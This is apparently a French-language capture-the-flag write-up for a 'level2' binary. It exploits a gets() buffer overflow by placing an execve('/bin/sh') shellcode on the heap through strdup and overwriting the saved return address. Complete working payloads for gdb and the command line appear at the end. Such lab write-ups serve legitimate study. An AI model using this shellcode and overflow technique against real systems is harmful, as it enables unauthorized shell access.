# level2

On disas et on voit qu'on a un main qui ne fait pas grand chose et qui call la fonction `p()`

La fonction `p()` verifie si l'adresse de retour contient 0xb

adresse system : `0xb7e6b060`
Pas bon du tout

strdup : heap retourne une adresse differente de 0xb
adresse return strdup : `0x804a008`
Peut-etre quelque chose a faire avec le retour de strdup ?

```
$> ltrace ./level2

__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550,0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)         = 0
gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5
) = 0xbffff6fc
puts("")                   = 1
strdup("")                 = 0x0804a008
```


shell code /bin/sh
`http://shell-storm.org/shellcode/files/shellcode-575.html`

Ok donc maintenant qu'on a ce shell code qui fait un appel system de `execve("/bin/sh")`

Il va falloir savoir quoi en faire et comment l'exploiter

On sait qu'on peut faire un BoF avec gets et on sait qu'on doit utiliser le retour de strdup sinon le programme rentre dans la comparaison avec 0xb et exit

On modifie `ebp+4` avec l'adresse de retour de strdup pour que le flux d'execution du retour de la fonction main pointe vers notre shell code
L'execution de code en memoire etant active nous pouvons donc executer le shell code

`ebp+4` etant toujours l'adresse de retour de la frame actuelle

Il nous faut notre offset pour modifier `ebp+4`

`https://wiremask.eu/tools/buffer-overflow-pattern-generator/`

Offset 80

Niquel, maintenant on sait que notre shell code fait 21
On soustrait 21 a 80 = 59

On aura un padding de 59 bytes apres notre shell code avant d'ecrire l'adresse de retour de strdup

On va mettre notre shell code au debut du payload etant donne que l'adresse de retour est un pointeur sur notre commande

Donc pour resume 

`payload = shellcode + padding 59 + addr retour strdup`

Testons tout ca :

Avec gdb
```
r < <(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"')
```

en ligne de commande
```
(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"'; cat) | ./level2 
```